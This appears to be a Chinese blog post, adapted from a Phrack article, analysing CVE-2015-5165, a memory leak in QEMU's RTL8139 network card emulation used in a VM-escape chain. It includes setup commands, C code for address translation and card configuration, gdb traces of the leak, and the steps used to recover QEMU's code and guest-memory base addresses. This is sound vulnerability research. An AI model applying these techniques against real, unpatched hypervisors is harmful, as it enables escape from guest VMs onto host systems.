---
title: VM escape-QEMU Case Study
date: 2021-04-10 18:25:46
tags:
- QEMU
- CVE
- 信息泄露
categories:
- Pwn
---
# VM escape-QEMU Case Study

http://jiayy.me/2019/04/15/CVE-2015-5165-7504/
http://jiayy.me/2019/04/15/CVE-2015-5165-7504/#cve-2015-5165-exp
https://programlife.net/2020/06/30/cve-2015-5165-qemu-rtl8139-vulnerability-analysis/

## 1 Intro

如今，虚拟机已大量部署以供个人使用或在企业细分市场中使用。 网络安全供应商使用不同的VM在*受控和受限*的环境中分析恶意软件。 一个自然的问题出现了：**恶意软件能否从虚拟机中逃脱并在主机上执行代码？**

2015年，来自CrowdStrike的Jason Geffner报告了QEMU中的一个严重错误（[CVE-2015-3456](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3456)），该错误影响了虚拟软盘驱动器代码，这可能使攻击者从VM逃脱到主机。 此漏洞在netsec社区中引起了极大的关注，可能是因为它有一个专用名（[VENOM](https://www.crowdstrike.com/blog/venom-vulnerability-details/)），这并不是第一个此类漏洞。

2011年，[Nelson Elhage](https://paper.bobylive.com/Meeting_Papers/BlackHat/USA-2011/BH_US_11_Elhage_Virtunoid_WP.pdf)在Blackhat 报告并成功利用了QEMU模拟PCI设备热插拔中的[漏洞](https://github.com/nelhage/virtunoid)。

2016年，来自奇虎360的刘旭和王胜平在HITB 2016上展示了对KVM / QEMU的成功利用。 他们利用了两个不同的网卡设备仿真器模型RTL8139和PCNET中存在的两个漏洞（CVE-2015-5165和CVE-2015-7504）。 在他们的演讲中，他们概述了在主机上执行代码的主要步骤，但没有提供任何利用，也没有提供再现它的技术细节。

在本文中，我们提供了对CVE-2015-5165（一个内存泄漏漏洞）和CVE-2015-7504（一个基于堆的溢出漏洞）的深入分析，以及可利用的漏洞。 这两个漏洞的结合可让您从VM突围并在目标主机上执行代码。

我们讨论了技术细节，以利用QEMU的**网卡设备仿真**中的漏洞，并提供可以重新使用以利用QEMU未来错误的通用技术。 例如，利用共享内存区域和共享代码的交互式绑定外壳。


## 2 KVM/QEMU Overview

KVM（Kernal-based Virtual Machine，基于内核的虚拟机）是一个内核模块，可为用户空间程序提供完整的虚拟化基础架构。 它允许一个人运行多个运行未修改的Linux或Windows映像的虚拟机。

KVM的用户空间组件包含在主线QEMU（快速仿真器）中，该QEMU特别处理设备仿真。


### 2.1 Workspace Environment

为了使那些想使用本文中给出的示例代码的人更轻松，我们在此处提供了重现我们的开发环境的主要步骤。

由于我们定位的漏洞已经修复，因此我们需要签出QEMU存储库的源，并切换到这些漏洞的修复之前的提交。 然后，我们仅为目标x86_64配置QEMU并启用调试，在我们的测试环境中，我们使用Gcc的4.9.2版构建QEMU：

```
    $ git clone git://git.qemu-project.org/qemu.git
    $
    $ git checkout bd80b59
    $ mkdir -p bin/debug/native
    $ cd bin/debug/native
    $ ../../../configure --target-list=x86_64-softmmu --enable-debug --disable-werror
    $ make
```


使用qemu-img来生成一个qcow2系统文件

```
**`$`**` ./qemu-img create -f qcow2 ubuntu.qcow2 20G`
$ sudo chmod 666 /dev/kvm
```

之后首先通过qemu-system-x86_64完成对qcow2系统文件中系统的安装，需要用-cdrom对iso镜像文件进行加载

```
$ ./x86_64-softmmu/qemu-system-x86_64 -enable-kvm -m 2048 -hda ./ubuntu.qcow2 -cdrom\
 '/home/han/VMescape/ubuntu-16.04-server-amd64.iso'
```

安装完成后就获得了一个有系统的qcow2文件，我们分配2GB的内存并创建两个网络接口卡：RTL8139和PCNET，同时创建tap接口连接虚拟机和主机：

```
✗ sudo tunctl -t tap0 -u `whoami`
✗ sudo ifconfig tap0 192.168.2.1/24
$ ./x86_64-softmmu/qemu-system-x86_64 -enable-kvm -m 2048 -display vnc=:89 \
-netdev user,id=t0, -device rtl8139,netdev=t0,id=nic0 -netdev user,id=t1, \
-device pcnet,netdev=t1,id=nic1 -drive  \
file=/home/han/VMescape/qemu/bin/debug/native/ubuntu.qcow2,\
format=qcow2,if=ide,cache=writeback,\
-net nic -net tap,ifname=tap0,script=no,downscript=no
```

使用vncviewer连接qemu

```
`apt-get install xvnc4viewer`
vncviewer 127.0.0.1:5989
```

###
2.2  QEMU Memory Layout

分配给guest虚拟机的物理内存实际上是QEMU虚拟地址空间中mmapp专用的区域。 重要的是要注意，分配guest的物理内存时未启用PROT_EXEC标志。

下图说明了来宾的内存和主机的内存如何共存。


```
                        Guest' processes
                     +--------------------+
Virtual addr space   |                    |
                     +--------------------+
                     |                    |
 **\__   Page Table     \__
                        \                    \**
                         |                    |  Guest kernel
                    +----+--------------------+----------------+
Guest's phy. memory |    |                    |                |
                    +----+--------------------+----------------+
                    |                                          |
 **\__                                        \__
                       \                                          \**
                        |             QEMU process                 |
                   +----+------------------------------------------+
Virtual addr space |    |                                          |
                   +----+------------------------------------------+
                   |                                               |
                    \__                Page Table                   \__
                       \                                               \
                        |                                               |
                   +----+-----------------------------------------------++
Physical memory    |    |                                               ||
                   +----+-----------------------------------------------++
```

此外，QEMU为BIOS和ROM保留了一个内存区域。 这些映射在QEMU映射文件中可用：

```
✗ cat /proc/36220/maps
555aae05c000-555aae931000 r-xp 00000000 08:01 2239549 /usr/bin/qemu-system-x86_64
555aaeb30000-555aaecfc000 r--p 008d4000 08:01 2239549 /usr/bin/qemu-system-x86_64
555aaecfc000-555aaed7b000 rw-p 00aa0000 08:01 2239549 /usr/bin/qemu-system-x86_64
555aaed7b000-555aaf1de000 rw-p 00000000 00:00 0
555ab0c1c000-555ab2015000 rw-p 00000000 00:00 0 [heap]
7f90b2e2b000-7f90b2e38000 r-xp 00000000 08:01 2758598          /usr/lib/x86_64-linux-gnu/sasl2/libdigestmd5.so.2.0.25
7f90b2e38000-7f90b3037000 ---p 0000d000 08:01 2758598          /usr/lib/x86_64-linux-gnu/sasl2/libdigestmd5.so.2.0.25
7f90b3037000-7f90b3038000 r--p 0000c000 08:01 2758598          /usr/lib/x86_64-linux-gnu/sasl2/libdigestmd5.so.2.0.25
7f90b3038000-7f90b3039000 rw-p 0000d000 08:01 2758598          /usr/lib/x86_64-linux-gnu/sasl2/libdigestmd5.so.2.0.25

                        ....                                   [other shared libs]

7f9152f96000-7f9152f99000 rw-s 00000000 00:0e 12527              anon_inode:kvm-vcpu:0
7f9152f99000-7f9152f9a000 r--p 00029000 08:01 2374490           /lib/x86_64-linux-gnu/ld-2.27.so
7f9152f9a000-7f9152f9b000 rw-p 0002a000 08:01 2374490           /lib/x86_64-linux-gnu/ld-2.27.so
7f9152f9b000-7f9152f9c000 rw-p 00000000 00:00 0
7ffe2cf63000-7ffe2cf84000 rw-p 00000000 00:00 0                 [stack]
7ffe2cf8f000-7ffe2cf92000 r--p 00000000 00:00 0                 [vvar]
7ffe2cf92000-7ffe2cf93000 r-xp 00000000 00:00 0                 [vdso]
ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0         [vsyscall]
```

有关虚拟化环境中内存管理的更详细说明，请参见：http://lettieri.iet.unipi.it/virtualization/2014/Vtx.pdf


### 2.3 Address Translation

在QEMU中存在两个翻译层：Guest Virtual Address → Guest Physical Address → Host Virtual Address

* 从Guest虚拟地址到Guest物理地址。 在我们的利用中，我们需要配置需要DMA访问的网卡设备。 例如，我们需要提供Tx / Rx缓冲区的**物理地址**以正确配置网卡设备。
* 从Guest物理地址到QEMU的虚拟地址空间。 在我们的攻击中，我们需要注入伪造的结构，并在**QEMU的虚拟地址空间**中获得其精确地址。

在x64系统上，虚拟地址由页偏移量（位0-11）和页码组成。 在linux系统上，具有CAP_SYS_ADMIN特权的用户空间进程能够使用页面映射文件（pagemap ）找出虚拟地址和物理地址的映射。 页面映射文件为每个虚拟页面存储一个64位值，其中`physical_address = PFN * page_size + offset`

```
**- Bits 0-54  : physical frame number if present.**
- Bit  55    : page table entry is soft-dirty.
- Bit  56    : page exclusively mapped.
- Bits 57-60 : zero
- Bit  61    : page is file-page or shared-anon.
- Bit  62    : page is swapped.
- Bit  63    : page is present.
```

将[虚拟地址（Guest Virtual Address）转换为物理地址（Guest Physical Address）](https://shanetully.com/2014/12/translating-virtual-addresses-to-physcial-addresses-in-user-space/)的过程包括

1. 64wei每个页面的大小为 `4096` 字节，即 `1 << 12` ；

1. 基于 `/proc/pid/pagemap` 可以查看进程任意 Virtual Page 的状态，包括是否被映射到物理内存以及在物理内存中的 Page Frame Number（PFN）等；

    * `pagemap` 文件为每个 Virtual Page 存储 `64` 位（即 `8` 字节）的信息，数据格式如上。

1. 对任意的虚拟地址 `address` ，基于 `address/4096` 可以计算出该虚拟地址在 `pagemap` 文件中的索引值， `address/4096 * 8` 即对应的文件偏移值，在该位置能够获取**PFN**信息；

1. 页内偏移对任意的虚拟地址 `address` ，`address%4096` 即虚拟地址在对应的内存页中的**偏移值**；

1. 根据物理内存的 PFN （**physical frame number**）以及页内偏移，就可以计算出对应的物理地址；

```
`physical_address = PFN * page_size + offset
physcial_addr ``=`` ``(``page_frame_number ``<<`` PAGE_SHIFT``)`` ``+`` distance_from_page_boundary_of_buffer`
```

我们依靠Nelson Elhage的[代码](https://github.com/nelhage/virtunoid/blob/master/virtunoid.c)。 下面的程序分配一个缓冲区，并用字符串“Where am I?”填充它。 并打印其物理地址：

```
---[ mmu.c ]---
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <fcntl.h>
#include <assert.h>
#include <inttypes.h>

#define PAGE_SHIFT  12
#define PAGE_SIZE   (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN     ((1ull << 55) - 1)

int fd;

uint32_t page_offset(uint32_t addr)
{
    return addr & ((1 << PAGE_SHIFT) - 1);
}

uint64_t gva_to_gfn(void *addr)
{
    uint64_t pme, gfn;
    size_t offset;
    offset = ((uintptr_t)addr >> 9) & ~7;
    lseek(fd, offset, SEEK_SET);
    read(fd, &pme, 8);
    if (!(pme & PFN_PRESENT))
        return -1;
    # The page frame number is in bits 0-54 so read the first 7 bytes and clear the 55th bit
    gfn = pme & PFN_PFN;
    return gfn;
}

uint64_t gva_to_gpa(void *addr)
{
    uint64_t gfn = gva_to_gfn(addr);
    assert(gfn != -1);
    return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
}

int main()
{
    uint8_t *ptr;
    uint64_t ptr_mem;

    fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) {
        perror("open");
        exit(1);
    }

    ptr = malloc(256);
    strcpy(ptr, "Where am I?");
    printf("%s\n", ptr);
    ptr_mem = gva_to_gpa(ptr);
    printf("Your physical address is at 0x%"PRIx64"\n", ptr_mem);

    getchar();
    return 0;
}
```

静态编译好程序之后将其上传到 QEMU 虚拟机中以 `root` 身份执行，打印出物理地址为 `0x73b17b20`
![](https://res.cloudinary.com/dozyfkbg3/image/upload/v1618050992/VMescape/image_29.png)
在主机将gdb附加到QEMU进程，我们可以看到缓冲区位于为guest虚拟机分配的物理地址空间内。 更准确地说，输出的guest物理地址地址实际上是与**guest物理内存基址**的偏移量。

```
✗ sudo gdb qemu-system-x86_64 38140
(gdb) info proc mappings
process 38140
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
      0x556857048000     0x55685791d000   0x8d5000        0x0 /usr/bin/qemu-system-x86_64
      0x556857b1c000     0x556857ce8000   0x1cc000   0x8d4000 /usr/bin/qemu-system-x86_64
      0x556857ce8000     0x556857d67000    0x7f000   0xaa0000 /usr/bin/qemu-system-x86_64
      0x556857d67000     0x5568581ca000   0x463000        0x0
      0x556859c27000     0x55685b038000  0x1411000        0x0 [heap]
                ...                 ...        ...        ...
      **0x7f72afe00000** **** **0x7f732fe00000** **** **0x80000000**        0x0 [2GB RAM]
                ...                 ...        ...        ...
(gdb) x/s 0x7f72afe00000+0x73b17b20
0x7f7323917b20: "Where am I?"
```

## 3 Memory Leak Exploitation

接下来，我们将利用CVE-2015-5165（一个会影响RTL8139网卡设备仿真器的内存泄漏漏洞）来重建QEMU的内存布局。 更准确地说，我们需要泄漏

1. .text段的基地址，以构建我们的shellcode
2. 为Guest分配的物理内存的基地址，以便能够获得 一些虚拟结构的地址

### 3.1  The vulnerable Code

REALTEK网卡支持两种 接收/发送 操作模式：C模式和C +模式。 当将网卡设置为使用C +时，网卡设备仿真器会错误地计算IP数据包数据的长度，最终发送的数据量会超出数据包中实际可用的数据量。

该漏洞存在于hw/net/rtl8139.c的 rtl8139_cplus_transmit_one 函数中：

```
/* ip packet header */
ip_header *ip = NULL;
int hlen = 0;
uint8_t  ip_protocol = 0;
uint16_t ip_data_len = 0;

uint8_t *eth_payload_data = NULL;
size_t   eth_payload_len  = 0;

int proto = be16_to_cpu(*(uint16_t *)(saved_buffer + 12));
if (proto == ETH_P_IP)
{
    DPRINTF("+++ C+ mode has IP packet\n");

    /* not aligned */
    eth_payload_data = saved_buffer + ETH_HLEN;
    eth_payload_len  = saved_size   - ETH_HLEN;

    ip = (ip_header*)eth_payload_data;

    if (IP_HEADER_VERSION(ip) != IP_HEADER_VERSION_4) {
        DPRINTF("+++ C+ mode packet has bad IP version %d "
            "expected %d\n", IP_HEADER_VERSION(ip),
            IP_HEADER_VERSION_4);
        ip = NULL;
    } else {
        hlen = IP_HEADER_LENGTH(ip);
        ip_protocol = ip->ip_p;
        **ip_data_len** **= be16_to_cpu(ip->ip_len) - hlen;**
    }
}
```

IP头包含两个字段hlen和ip-> ip_len，分别表示IP头的长度（考虑到不带选项的数据包，为20字节）和包括ip头的数据包的总长度。 如下面给出的代码片段末尾所示，在计算IP数据长度（ip_data_len）时，没有检查以确保 ip→ip_len >=  hlen 。 由于ip_data_len字段被编码为unsigned short int，因此导致发送的数据多于发送缓冲区中实际可用的数据。

更精确地讲，ip_data_len稍后用于计算TCP数据的长度，如果该数据超过MTU的大小，则将其逐块复制到一个malloc缓冲区中：

```
int **tcp_data_len** **= ip_data_len - tcp_hlen;**
int tcp_chunk_size = ETH_MTU - hlen - tcp_hlen;

int is_last_frame = 0;

for (tcp_send_offset = 0; tcp_send_offset < tcp_data_len;
    tcp_send_offset += tcp_chunk_size) {
    uint16_t chunk_size = tcp_chunk_size;

    /* check if this is the last frame */
    if (tcp_send_offset + tcp_chunk_size >= tcp_data_len) {
        is_last_frame = 1;
        chunk_size = tcp_data_len - tcp_send_offset;
    }

    memcpy(data_to_checksum, saved_ip_header + 12, 8);

    if (tcp_send_offset) {
        memcpy((uint8_t*)p_tcp_hdr + tcp_hlen,
                (uint8_t*)p_tcp_hdr + tcp_hlen + tcp_send_offset,
                chunk_size);
    }

    /* more code follows */
}
```

因此，如果我们伪造了长度损坏的畸形数据包（例如ip→ip_len  =  hlen-1），则可能会从QEMU的堆内存中泄漏大约64 KB。网卡设备仿真器将通过发送43个分段的数据包结束， 而不是发送单个数据包。


### 3.2  Setting up the Card

为了发送格式错误的数据包并读取泄漏的数据，我们需要在卡上配置Rx和Tx描述符缓冲区，并设置一些标志，以使我们的数据包流经易受攻击的代码路径。

下图显示了RTL8139寄存器。 我们将不详述所有这些内容，而是仅详述与我们的利用相关的那些内容：

```
            +---------------------------+----------------------------+
    0x00    |           MAC0            |            MAR0            |
            +---------------------------+----------------------------+
    0x10    |                       TxStatus0                        |
            +--------------------------------------------------------+
    0x20    |                        TxAddr0                         |
            +-------------------+-------+----------------------------+
    0x30    |        RxBuf      |ChipCmd|                            |
            +-------------+------+------+----------------------------+
    0x40    |   TxConfig  |  RxConfig   |            ...             |
            +-------------+-------------+----------------------------+
            |                                                        |
            |             skipping irrelevant registers              |
            |                                                        |
            +---------------------------+--+------+------------------+
    0xd0    |           ...             |  |TxPoll|      ...         |
            +-------+------+------------+--+------+--+---------------+
    0xe0    | CpCmd |  ... |RxRingAddrLO|RxRingAddrHI|    ...        |
            +-------+------+------------+------------+---------------+
```

* **TxConfig:** 启用/禁用Tx标志，例如TxLoopBack（启用回送测试模式），TxCRC（不将CRC附加到Tx数据包）等。
* **RxConfig:** 启用/禁用Rx标志，例如AcceptBroadcast（接受广播数据包），AcceptMulticast（接受组播数据包）等。
* **CpCmd:** C+命令寄存器，用于启用某些功能，例如CplusRxEnd（启用接收），CplusTxEnd（启用发送）等。
* **TxAddr0:** Tx描述符表的物理内存地址。
* **RxRingAddrLO:** Rx描述符表的低32位物理内存地址。
* **RxRingAddrHI:** Rx描述符表的高32位物理内存地址。
* **TxPoll:**告诉网卡检查Tx描述符。

Rx/Tx描述符 由以下结构定义，其中buf_lo和buf_hi分别是Tx/Rx缓冲区的低32位和高32位物理存储地址。 这些地址指向保存要发送/接收的数据包的缓冲区，并且必须在页面大小边界上对齐。 变量dw0对缓冲区的大小以及其他标志（例如所有权标志）进行编码，以表示缓冲区是由网卡还是由驱动程序拥有。

```
struct rtl8139_desc {
    uint32_t dw0;
    uint32_t dw1;
    uint32_t **buf_lo**;
    uint32_t **buf_hi**;
};
```

网卡通过in*()  out*()原语（来自sys/io.h）进行配置。 为此，我们需要具有CAP_SYS_RAWIO特权。 以下代码段配置了网卡并设置了一个Tx描述符。

```
#define RTL8139_PORT        0xc000
#define RTL8139_BUFFER_SIZE 1500

struct rtl8139_desc desc;
void *rtl8139_tx_buffer;
uint32_t phy_mem;

rtl8139_tx_buffer = aligned_alloc(PAGE_SIZE, RTL8139_BUFFER_SIZE);
phy_mem = (uint32)gva_to_gpa(rtl8139_tx_buffer);

memset(&desc, 0, sizeof(struct rtl8139_desc));

desc->dw0 |= CP_TX_OWN | CP_TX_EOR | CP_TX_LS | CP_TX_LGSEN |
             CP_TX_IPCS | CP_TX_TCPCS;
desc->dw0 += RTL8139_BUFFER_SIZE;

desc.buf_lo = phy_mem;

iopl(3);

outl(TxLoopBack, RTL8139_PORT + TxConfig);
outl(AcceptMyPhys, RTL8139_PORT + RxConfig);

outw(CPlusRxEnb|CPlusTxEnb, RTL8139_PORT + CpCmd);
outb(CmdRxEnb|CmdTxEnb, RTL8139_PORT + ChipCmd);

outl(phy_mem, RTL8139_PORT + TxAddr0);
outl(0x0, RTL8139_PORT + TxAddr0 + 0x4);
```

### 3.3  Exploit

phrack随附的源代码中提供了完整的利用（cve-2015-5165.c）。（ uuencode用于将二进制文件编码为纯ASCII文本，以便可以通过电子邮件发送它们。）
cve-2015-5165.c依赖qemu.h头文件中的函数偏移地址，因此首先需要通过[build-exploit.sh](https://github.com/jiayy/android_vuln_poc-exp/blob/master/EXP-2015-7504/build-exploit.sh)来进行计算。

```
./build-exploit.sh '/home/han/VMescape/qemu/bin/debug/native/x86_64-softmmu/qemu-system-x86_64'
```

该漏洞利用程序在网卡上配置所需的寄存器，并设置Tx和Rx缓冲区描述符。 然后，它伪造了格式错误的IP数据包，该IP数据包的目的地址和源地址为网卡的MAC地址。 这使我们能够通过访问已配置的Rx缓冲区来读取泄漏的数据。
通过对qemu运行程序下断点，可用看到漏洞触发的过程，由于ip_len小于伪造的hlen，导致最后tcp_data_len比实际的 tcp 数据大， 多余的内存区会被拷贝到包里发送出去（网卡需要配置为loopback 口）

```
(gdb) b rtl8139.c:2173
Breakpoint 1 at 0x55a5ef757b03: file /home/han/VMescape/qemu/hw/net/rtl8139.c, line 2173.
(gdb) c
Continuing.

Thread 3 "qemu-system-x86" hit Breakpoint 1, rtl8139_cplus_transmit_one (s=0x55a5f26ecfe0)
at /home/han/VMescape/qemu/hw/net/rtl8139.c:2173
2173 if (IP_HEADER_VERSION(ip) != IP_HEADER_VERSION_4) {
(gdb) p/x ip
$1 = 0x7ff7d4278b6e
(gdb) p/x *ip
$2 = {ip_ver_len = 0x45, ip_tos = 0x0, ip_len = 0x1300, ip_id = 0xadde, ip_off = 0x40, ip_ttl = 0x40, ip_p = 0x6,
ip_sum = 0xadde, ip_src = 0x10108c0, ip_dst = 0x201a8c0}
(gdb) n
[Thread 0x7ff7e131f700 (LWP 56763) exited]
2179 hlen = IP_HEADER_LENGTH(ip);
(gdb) n
2180 ip_protocol = ip→ip_p;
(gdb) p/x hlen
$5 = 0x14
(gdb) n
2181 ip_data_len = be16_to_cpu(ip->ip_len) - hlen;
(gdb) n
2185 if (ip)
(gdb) p/x ip_data_len
**$7 = 0xffff**
(gdb) b rtl8139.c:2231
Breakpoint 2 at 0x55a5ef757d42: file /home/han/VMescape/qemu/hw/net/rtl8139.c, line 2231.
(gdb) c
Continuing.

Thread 3 "qemu-system-x86" hit Breakpoint 2, rtl8139_cplus_transmit_one (s=0x55a5f26ecfe0)
at /home/han/VMescape/qemu/hw/net/rtl8139.c:2231
2231 int tcp_data_len = ip_data_len - tcp_hlen;
(gdb) n
2232 int tcp_chunk_size = ETH_MTU - hlen - tcp_hlen;
(gdb) p/x tcp_data_len
**$8 = 0xffeb**
```


虚拟机内部的用户进程通过读取收包队列的数据包就可以知道被泄露的那块 qemu 内存区的内容。在分析泄漏的数据时，我们观察到存在多个函数指针。经过调试，发现这些函数指针都是struct ObjectProperty这个 qemu 内部结构体的数据。struct ObjectProperty 包含 11 个指针, 这里边有 4 个函数指针 **get/set/resolve/release**

```
typedef struct ObjectProperty
{
    gchar *name;
    gchar *type;
    gchar *description;
    ObjectPropertyAccessor *get;
    ObjectPropertyAccessor *set;
    ObjectPropertyResolve *resolve;
    ObjectPropertyRelease *release;
    void *opaque;

    QTAILQ_ENTRY(ObjectProperty) node;
} ObjectProperty;
```

QEMU遵循对象模型来管理设备，内存区域等。启动时，QEMU创建多个对象并为其分配属性。 例如，以下的函数将“may-overlap”属性添加给一个内存区域对象。 此属性具有getter方法，可以检索此boolean属性的值：

```
object_property_add_bool(OBJECT(mr), "may-overlap",
                         memory_region_get_may_overlap,
                         NULL, /* memory_region_set_may_overlap */
                         &error_abort);
```

RTL8139网卡设备仿真器在堆上保留了64 KB的空间以重组数据包。 该分配的缓冲区很可能把释放掉的object properties的内存占位了。

在我们的漏洞利用中，我们在泄漏的内存中搜索已知的对象属性。更准确地说，我们正在寻找80个字节的内存块（块大小为已释放的ObjectProperty结构），其中至少设置了一个函数指针（get, set, resolve or release）。
即使这些地址受ASLR约束，我们仍然可以猜测**.text节的基地址**。

> 0) 从 qemu-system-x86_64 二进制文件里搜索上述 4 类符号的所有静态地址， 如 **property_get_bool** 等符号的地址

> 1) 在读回来的 IP 包的数据里搜索值等于 0x60 的内存 ptr， 如果匹配到， 认为 (u64*)ptr+1 的地方就是一个潜在的 struct ObjectProperty 对象, 对应的函数是 **qemu_get_leaked_chunk**

> 2) 在 1 搜索到的内存上匹配 0 收集到的 **get/set/resolve/release** 这几种符号的静态地址, 匹配方式为页内偏移相等， 如果匹配到， 认为就是 struct ObjectProperty 对象, 对应的函数是 **qemu_get_leaked_object_property**

> 3) 在 2 搜索的基础上， 用 **object->get/set/resolve/release** 的实际地址减去静态编译里算出来的 offset, 得到 .text 加载的地址

实际上，它们的页面偏移是固定的（12个最低有效位或虚拟地址不是随机的）。 我们可以通过一些算法来获取QEMU一些有用函数的地址。 我们还可以从它们的PLT条目中导出某些LibC函数的地址，例如mprotect() 和system()。
![](https://res.cloudinary.com/dozyfkbg3/image/upload/v1618050992/VMescape/image_30.png)
我们还注意到，地址PHY_MEM + 0x78泄漏了几次，其中PHY_MEM是分配给该Guest的**物理内存的起始地址。**


> 总结：当前漏洞利用程序搜索泄漏的内存，并尝试解析（i）.text段的基地址和（ii）物理内存的基地址。

### 3.4 遇到的几个问题

1. phrack提供的build-exploit.sh, 它是一个工具脚本，用来获取一些符号的（相对）地址。[原始的](http://www.phrack.org/papers/vm-escape-qemu-case-study.html) build-exploit.sh 获取 plt 段是通过下面的命令行：
2. `plt**=**$(readelf -S $binary | grep plt | tail -n 1 | awk '{print $2}')`

这样获取到的是 .plt.got 段，在我的环境里， mprotect 等系统函数符号没有在 .plt.got 这个段，而是在 .plt 这个段。因此替换如下：

```
#plt=$(readelf -S $binary | grep plt | tail -n 1 | awk '{print $2}')
plt=.plt
```

1. Phrack 文章提供的 Exploit 代码中搜索的地址是PHY_MEM + 0x78，但实际上并不固定为0x78，更通用的做法是统计泄露的数据中出现的 `uint64_t` 类型的数据 `0x00007FXXYYZZZZZZ` ，其中 `7FXXYY` 出现次数最多的数据，就是 QEMU 虚拟机物理内存的结束地址；修改之后成功获得物理地址

<img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1618050992/VMescape/image_31.png" width="50%" height="50%">

通过 gdb 调试验证结果正确性：

<img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1618050992/VMescape/image_32.png" width="50%" height="50%">
